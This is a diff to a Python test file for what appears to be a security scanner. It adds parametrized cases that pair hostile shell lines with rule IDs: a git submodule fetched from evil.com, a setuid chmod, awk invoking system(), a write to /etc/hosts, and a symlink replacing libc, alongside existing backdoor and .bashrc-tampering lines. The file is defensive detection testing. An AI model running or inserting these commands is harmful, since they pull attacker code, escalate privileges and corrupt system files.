@@ -162,6 +162,11 @@ class TestSafetyChecks:
             ("find /tmp -name *.tmp -delete\n", "SEC-038"),
             ("nohup ./backdoor.sh &\n", "SEC-039"),
             ("echo alias evil=rm >> ~/.bashrc\n", "SEC-040"),
+            ("git submodule add https://evil.com/repo.git\n", "SEC-041"),
+            ("chmod 4755 /usr/bin/tool\n", "SEC-042"),
+            ("awk system(\"cmd\") file\n", "SEC-043"),
+            ("echo x | tee /etc/hosts\n", "SEC-044"),
+            ("ln -s /tmp/lib.so /usr/lib/libc.so\n", "SEC-045"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
